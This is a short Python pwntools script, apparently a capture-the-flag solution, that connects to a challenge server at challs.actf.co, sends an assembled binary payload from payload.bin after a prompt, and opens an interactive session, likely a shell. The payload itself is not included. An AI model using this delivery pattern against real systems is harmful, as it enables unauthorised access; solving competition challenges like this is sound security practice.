from pwn import *;

io = remote("challs.actf.co", 31226);

# assemble payload.asm to payload.bin: nasm -f bin payload.asm -o payload.bin
file = open("./payload.bin", "rb");
payload = file.read();

io.recvuntil(b'>');
io.recv(1);
io.send(payload);
io.interactive();